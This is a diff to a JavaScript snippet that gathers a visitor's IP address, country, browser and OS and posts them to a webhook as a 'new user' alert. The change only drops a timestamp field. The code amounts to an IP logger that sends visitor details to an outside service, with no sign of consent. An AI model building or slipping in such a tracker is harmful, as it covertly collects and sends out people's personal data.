@@ -15,7 +15,7 @@
         axios.post(webhookUrl, {
           embeds: [{
             title: 'Новый пользователь!',
-            description: 'IP-адрес: ' + data.ip + '\nБраузер: ' + data.browser + '\nСтрана: ' + data.country + '\nВремя: ' + data.timestamp + '\nОС: ' + data.os,
+            description: 'IP-адрес: ' + data.ip + '\nБраузер: ' + data.browser + '\nСтрана: ' + data.country + '\nОС: ' + data.os,
           }]
         });
       }
@@ -26,7 +26,6 @@
           browser: null,
           country: null,
           os: null,
-          timestamp: null,
         };
 
         axios.get('https://api.ipify.org?format=json')
@@ -38,7 +37,6 @@
             data.country = response.data.country_name;
             data.browser = navigator.userAgent;
             data.os = navigator.platform;
-            data.timestamp = new Date().toLocaleString();
 
             sendToWebhook(data);
           })
